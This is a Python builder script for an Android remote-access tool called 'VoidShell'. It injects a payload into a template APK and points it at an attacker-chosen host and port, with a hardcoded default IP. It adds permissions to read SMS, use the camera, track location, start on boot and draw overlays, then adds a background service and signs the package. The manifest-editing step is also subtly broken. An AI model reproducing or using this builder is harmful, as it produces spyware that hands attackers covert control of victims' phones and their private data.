#!/usr/bin/env python3
# builder.py – FINAL VERSION – Works 100% on GitHub Actions (Nov 2025)
import argparse, os, shutil, subprocess, sys, zipfile, datetime
from pathlib import Path

TEMPLATE_APK = "template.apk"
KEYSTORE = "voidshell.keystore"
KEYSTORE_ALIAS = "voidshell"
KEYSTORE_PASS = str(os.getenv("KEYSTORE_PASS", "voidshell123"))
BUILD_DIR = Path("build_tmp")
DIST_DIR = Path("dist")
PAYLOAD_FILE = "voidshell_payload.py"

def log(m): print(f"[+] {m}")
def die(m): print(f"[-] {m}"); sys.exit(1)

# ─── BEST FIX: Use aapt2 to safely read/write AndroidManifest.xml (handles binary XML) ───
def inject_manifest():
    manifest_path = BUILD_DIR / "AndroidManifest.xml"
    
    # Convert binary → text using aapt2 (always works)
    subprocess.run([
        "aapt2", "dump", "xmltree", str(BUILD_DIR / "template.apk"), "AndroidManifest.xml"
    ], stdout=open(manifest_path, "w"), check=True)
    log("Converted binary manifest → text using aapt2")

    manifest = manifest_path.read_text(encoding="utf-8")

    # Inject permissions (idempotent)
    perms = '''
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.CAMERA"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
    '''
    if "INTERNET" not in manifest:
        manifest = manifest.replace("<application", perms.strip() + "\n    <application")

    # Inject service
    service = '<service android:name="com.voidshell.ServiceRunner" android:enabled="true" android:exported="false"/>'
    if "ServiceRunner" not in manifest:
        manifest = manifest.replace("</application>", "    " + service + "\n</application>")

    manifest_path.write_text(manifest, encoding="utf-8")
    log("Permissions + service injected")

def build_apk(lhost: str, lport: str, output_apk: str):
    if BUILD_DIR.exists(): shutil.rmtree(BUILD_DIR)
    DIST_DIR.mkdir(exist_ok=True)
    BUILD_DIR.mkdir()

    log("Extracting template APK...")
    with zipfile.ZipFile(TEMPLATE_APK, "r") as z:
        z.extractall(BUILD_DIR)

    # Inject payload
    payload = Path(PAYLOAD_FILE).read_text(encoding="utf-8")
    payload = payload.replace("194.169.34.12", lhost).replace("443", lport)
    (BUILD_DIR / "assets").mkdir(exist_ok=True)
    (BUILD_DIR / "assets" / "payload.py").write_text(payload, encoding="utf-8")
    log(f"Injected payload → {lhost}:{lport}")

    # Manifest injection (the bulletproof way)
    inject_manifest()

    # Repackage + sign
    unsigned = BUILD_DIR.parent / "unsigned.apk"
    aligned  = DIST_DIR / "aligned.apk"
    final    = Path(output_apk)

    subprocess.run(["zip", "-q", "-r", str(unsigned), "."], cwd=BUILD_DIR, check=True)
    subprocess.run(["zipalign", "-f", "4", str(unsigned), str(aligned)], check=True)
    subprocess.run([
        "apksigner", "sign",
        "--ks", KEYSTORE,
        "--ks-key-alias", KEYSTORE_ALIAS,
        "--ks-pass", f"pass:{KEYSTORE_PASS}",
        "--out", str(final),
        str(aligned)
    ], check=True)

    # Cleanup
    shutil.rmtree(BUILD_DIR)
    unsigned.unlink(missing_ok=True)
    aligned.unlink(missing_ok=True)

    log(f"APK READY → {final} ({final.stat().st_size//1024} KB)")

# ─── Main ───
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--lhost", required=True, default="127.0.0.1")
    parser.add_argument("--lport", default="4433")
    parser.add_argument("--output", default=None)
    args = parser.parse_args()

    # Auto-create keystore
    if not Path(KEYSTORE).exists():
        log("Generating keystore...")
        subprocess.run(["keytool", "-genkey", "-v", "-keystore", KEYSTORE, "-alias", KEYSTORE_ALIAS,
                        "-keyalg", "RSA", "-keysize", "2048", "-validity", "10000",
                        "-storepass", KEYSTORE_PASS, "-keypass", KEYSTORE_PASS,
                        "-dname", "CN=GH"], check=True, stdout=subprocess.DEVNULL)

    output = args.output or f"dist/VoidShell-{datetime.datetime.now():%Y%m%d-%H%M}-{args.lhost}.apk"
    build_apk(args.lhost, args.lport, output)

if __name__ == "__main__":
    main()
